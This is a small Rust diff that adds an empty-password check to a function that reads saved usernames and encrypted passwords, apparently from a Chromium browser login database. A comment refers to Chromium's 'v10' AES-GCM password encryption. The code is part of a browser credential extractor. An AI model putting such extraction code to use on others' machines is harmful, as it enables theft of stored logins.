@@ -111,6 +111,10 @@ pub fn login_credentials() -> ExtractorResult<Vec<Credential>> {
             let username_value = row.get::<_, String>(1)?;
             let password_value = row.get::<_, Vec<u8>>(2)?;
 
+            if password_value.len() <= 0 {
+                continue;
+            }
+
             // Prefix "v10" is used for AES-GCM encrypted passwords w/ length of 3
             // https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=33
             //
